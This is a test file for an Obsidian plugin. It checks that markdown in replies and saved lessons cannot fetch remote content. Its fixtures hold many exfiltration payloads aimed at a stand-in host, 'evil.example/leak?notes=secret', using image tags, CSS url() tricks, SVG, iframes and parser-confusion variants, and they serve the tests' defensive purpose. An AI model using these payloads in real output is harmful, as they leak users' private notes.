// @vitest-environment happy-dom
import nodeConsole from "node:console";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { flushSync, mount, unmount } from "svelte";
import { Component, MarkdownRenderer, type App } from "obsidian";
import Markdown from "../src/ui/components/Markdown.svelte";
import { renderMarkdown } from "../src/ui/lib/markdown";
import { inertMarkdown } from "../src/core/inert";
import { store } from "../src/ui/lib/store.svelte";
import { fixture } from "./helpers";

// Obsidian adds this to every element.
Object.defineProperty(HTMLElement.prototype, "empty", {
  configurable: true,
  value() {
    this.replaceChildren();
  },
});
// And this global (only the options the plugin uses).
Object.assign(globalThis, {
  createEl(
    tag: string,
    o: { cls?: string; href?: string; title?: string; text?: string; attr?: Record<string, string> } = {},
  ) {
    const el = document.createElement(tag);
    if (o.cls) el.className = o.cls;
    if (o.href) el.setAttribute("href", o.href);
    if (o.title) el.title = o.title;
    if (o.text) el.textContent = o.text;
    for (const [k, v] of Object.entries(o.attr ?? {})) el.setAttribute(k, v);
    return el;
  },
});

// Happy DOM reports each frame or stylesheet it didn't load (see vitest.config.ts); that's expected here.
// It reports to Node's console, not the one Vitest gives tests.
beforeEach(() => {
  const error = nodeConsole.error.bind(nodeConsole);
  vi.spyOn(nodeConsole, "error").mockImplementation((...args) => {
    if (!String(args[0]).includes("loading is disabled")) error(...args);
  });
});

afterEach(() => {
  vi.restoreAllMocks();
  document.body.replaceChildren();
});

const EVIL = "https://evil.example/leak?notes=secret";

/** Stand in for Obsidian's renderer: write the HTML it would produce, and note where. */
function renderAs(html: string, later?: string) {
  const targets: HTMLElement[] = [];
  vi.spyOn(MarkdownRenderer, "render").mockImplementation(async (_app, _md, el) => {
    targets.push(el);
    el.innerHTML = html;
    if (later) setTimeout(() => el.insertAdjacentHTML("beforeend", later), 0);
    // Like Obsidian's in an inert document: it waits for images that never load.
    return new Promise<void>(() => {});
  });
  return targets;
}

function render(html: string, later?: string) {
  const targets = renderAs(html, later);
  const view = document.body.appendChild(document.createElement("div"));
  const owner = new Component();
  const stop = renderMarkdown({} as App, "reply", view, owner);
  return { view, targets, stop };
}

describe("rendering replies", () => {
  it("renders where nothing can load, then shows the result", () => {
    const { view, targets } = render("<p>Hello <strong>there</strong></p>");
    expect(targets[0].ownerDocument).not.toBe(document);
    expect(targets[0].ownerDocument.defaultView).toBeNull();
    expect(view.innerHTML).toBe("<p>Hello <strong>there</strong></p>");
  });

  it("turns remote images into links and keeps local ones", () => {
    const { view } = render(
      `<p>See <img alt="diagram" src="${EVIL}"> and <img src="app://local/vault/pic.png" alt="mine"> or <img src="//evil.example/x"></p>`,
    );
    const imgs = [...view.querySelectorAll("img")];
    expect(imgs.map((i) => i.getAttribute("src"))).toEqual(["app://local/vault/pic.png"]);
    const link = view.querySelector("a")!;
    expect(link.textContent).toBe("diagram");
    expect(link.getAttribute("href")).toBe(EVIL);
    expect(view.textContent).toContain("image");
  });

  it("turns a remote image into a link when it's the whole reply", () => {
    const { view } = render(`<img alt="diagram" src="${EVIL}">`);
    expect(view.querySelector("img")).toBeNull();
    expect(view.querySelector("a")!.getAttribute("href")).toBe(EVIL);
  });

  it("drops frames, media, styles and anything else that would fetch", () => {
    const { view } = render(
      `<iframe src="${EVIL}"></iframe>` +
        `<p>a<video src="${EVIL}" poster="${EVIL}"></video><audio><source src="${EVIL}"></audio><object data="${EVIL}"></object><embed src="${EVIL}"></p>` +
        `<style>@import url(${EVIL});</style><link rel="stylesheet" href="${EVIL}">` +
        `<p style="background: url(${EVIL})">b</p><p style="background: u\\72l(${EVIL})">c</p><p style="text-align: center">d</p>` +
        `<svg><image href="${EVIL}"></image><use href="${EVIL}#x"></use><rect fill="url(${EVIL}#p)"></rect></svg>` +
        `<p><img src="app://local/a.png" srcset="${EVIL} 2x"></p>`,
    );
    expect(view.innerHTML).not.toContain("evil.example");
    expect(view.querySelector("p[style]")!.getAttribute("style")).toBe("text-align: center");
    expect(view.querySelector("img")!.getAttribute("src")).toBe("app://local/a.png");
  });

  it("checks output that arrives after the first pass too", async () => {
    const { view } = render(
      "<p>first</p>",
      `<p>late <img src="${EVIL}" alt="late"></p><iframe src="${EVIL}"></iframe>`,
    );
    await new Promise((r) => setTimeout(r, 10));
    expect(view.textContent).toBe("firstlate late");
    expect(view.innerHTML).not.toContain("<img");
    expect(view.innerHTML).not.toContain("iframe");
  });

  it("checks later changes deep inside what's already shown", async () => {
    const { view, targets } = render(
      `<p>Shown <span class="slot"></span> <img class="local" src="app://local/a.png"></p>`,
    );
    const original = targets[0];
    // What Obsidian does after its first pass, from an embed loading to a processor setting a source.
    original.querySelector(".slot")!.innerHTML = `<img alt="late" src="${EVIL}"><iframe src="${EVIL}"></iframe>`;
    original.querySelector(".local")!.setAttribute("src", EVIL);
    original.querySelector("p")!.setAttribute("style", `background: url(${EVIL})`);
    await Promise.resolve();
    expect(view.querySelectorAll("img, iframe")).toHaveLength(0);
    expect([...view.querySelectorAll("a")].map((a) => a.textContent)).toEqual(["late", "image"]);
    expect(view.querySelector("p")!.hasAttribute("style")).toBe(false);
    // Nothing the renderer holds is ever in the view.
    for (const el of view.querySelectorAll("*")) expect(original.contains(el)).toBe(false);
  });

  it("passes clicks to Obsidian's own buttons on the original", async () => {
    const { view, targets } = render(
      `<pre><code>let a = 1</code><button class="copy-code-button"><svg><path></path></svg></button></pre><p><a class="external-link" href="https://example.com">site</a></p>`,
    );
    const copy = vi.fn((e: Event) => e.preventDefault());
    const opened = vi.fn();
    targets[0].querySelector("button")!.addEventListener("click", copy);
    targets[0].querySelector("a")!.addEventListener("click", opened);
    const click = new MouseEvent("click", { bubbles: true, cancelable: true });
    view.querySelector("path")!.dispatchEvent(click);
    expect(copy).toHaveBeenCalledTimes(1);
    expect(click.defaultPrevented).toBe(true);
    // A link opens from the copy itself, not twice.
    view.querySelector("a")!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    expect(opened).not.toHaveBeenCalled();
  });

  it("unwraps an inline reply's paragraph", () => {
    const f = fixture();
    store.init(
      f.backend,
      () => f.settings,
      async () => {},
    );
    renderAs("<p>Just <em>this</em></p>");
    const target = document.body.appendChild(document.createElement("div"));
    const cmp = mount(Markdown, { target, props: { md: "Just *this*", inline: true } });
    flushSync();
    expect(target.querySelector(".ct-inline")!.innerHTML).toBe("Just <em>this</em>");
    unmount(cmp);
  });
});

describe("saved lessons", () => {
  it.each([
    ["an image", `![diagram](${EVIL})`, `[diagram](${EVIL})`],
    ["an image with a title", `![a](<${EVIL}> "t")`, `[a](<${EVIL}> "t")`],
    ["a reference image", `![a][r]\n\n[r]: ${EVIL}`, `[a][r]\n\n[r]: ${EVIL}`],
    ["a linked image", `[![a](${EVIL})](https://x.example)`, `[[a](${EVIL})](https://x.example)`],
    ["an image whose alt looks like an embed", `![[a]](${EVIL})`, `[[a]](${EVIL})`],
    ["an embed of a URL", `![[${EVIL}]]`, `[[${EVIL}]]`],
    ["an image tag", `<img src="${EVIL}">`, `< img src="${EVIL}">`],
    ["an image tag over lines", `<IMG\nsrc=${EVIL}>`, `< IMG\nsrc=${EVIL}>`],
    ["an image tag with a slash", `<img/src=${EVIL}>`, `< img/src=${EVIL}>`],
    ["an unclosed frame", `<iframe src="${EVIL}"`, `< iframe src="${EVIL}"`],
    ["an SVG image", `<svg><image href="${EVIL}"/></svg>`, `<svg>< image href="${EVIL}"/></svg>`],
    [
      "a CSS background",
      `<div style="background:url(${EVIL})">x</div>`,
      `< div style="background:url(${EVIL})">x</div>`,
    ],
    ["an escaped CSS background", `<p style="background:\\75rl(x)">`, `< p style="background:\\75rl(x)">`],
    ["an encoded CSS background", `<p style="background:&#117;rl(x)">`, `< p style="background:&#117;rl(x)">`],
    ["a fetching attribute", `<table background="${EVIL}">`, `< table background="${EVIL}">`],
    ["an attribute right after a quoted one", `<a title="x"ping="${EVIL}">`, `< a title="x"ping="${EVIL}">`],
    ["a stylesheet", `<style>@import "${EVIL}";</style>`, `< style>@import "${EVIL}";< /style>`],
    [
      'a style after a quoted ">"',
      `<div title=">" style="background-image:url(${EVIL})">`,
      `< div title=">" style="background-image:url(${EVIL})">`,
    ],
    [
      'a style after a single-quoted ">"',
      `<div title='>' style=background:url(${EVIL})>`,
      `< div title='>' style=background:url(${EVIL})>`,
    ],
    [
      "a style after a quote in a name",
      `<div x" title=">" style="background:url(${EVIL})">`,
      `< div x" title=">" style="background:url(${EVIL})">`,
    ],
    [
      "an image inside an invalid tag's attribute",
      `<a title="<img src=${EVIL}>" \\x>`,
      `<a title="< img src=${EVIL}>" \\x>`,
    ],
    ['an image right after another "<"', `<x<img src=${EVIL}>`, `< x< img src=${EVIL}>`],
    [
      "a tag name a browser reads further",
      `<div$ style="background:url(${EVIL})">`,
      `< div$ style="background:url(${EVIL})">`,
    ],
    // Code is changed too: a parser could disagree about where it ends.
    ["code that isn't code", `- a\n\n   \`\`\`\n   x\n\n![a](${EVIL})`, `- a\n\n   \`\`\`\n   x\n\n[a](${EVIL})`],
  ])("can't load %s", (_, md, safe) => {
    expect(inertMarkdown(md)).toBe(safe);
  });

  it("keeps what loads nothing", () => {
    const md = [
      "**Bold**, $0<x<1$, a < b, x<y, <https://example.com> and [a link](https://example.com).",
      "![[Diagram.png]] ![[Note#Heading: part|alias]]",
      'H<sub>2</sub>O, <kbd>Ctrl</kbd>, <span style="color: red">red</span>, <a href="https://example.com">link</a>',
      "<details><summary>More</summary>Hidden</details>",
      "```\nconst x = a<b;\n```",
    ].join("\n\n");
    expect(inertMarkdown(md)).toBe(md);
  });

  it('only spaces out a "<" it has to, so math still reads the same', () => {
    expect(inertMarkdown("$0<x<1$, and $y=\\frac{1}{2}$ > 0")).toBe("$0< x<1$, and $y=\\frac{1}{2}$ > 0");
  });

  it("writes and opens a lesson that can't load anything", async () => {
    const f = fixture(["a.md"]);
    const create = vi.fn(async (_path: string, _data: string) => {});
    const open = vi.fn(async () => {});
    Object.assign(f.vault, { create, createFolder: vi.fn(async () => {}) });
    Object.assign(f.app.workspace, { openLinkText: open });
    const path = await f.backend.saveLesson(`Topic ![x](${EVIL})`, `Summary ![diagram](${EVIL}) <img src="${EVIL}">`, [
      "a.md",
    ]);
    const saved = create.mock.calls[0][1];
    expect(saved).toContain(`# Topic [x](${EVIL})`);
    expect(saved).toContain(`Summary [diagram](${EVIL}) < img src="${EVIL}">`);
    expect(saved).toContain("- [[a]]");
    expect(saved).not.toMatch(/!\[(?!\[)|<img/);
    expect(open).toHaveBeenCalledWith(path, "", "tab");
  });
});
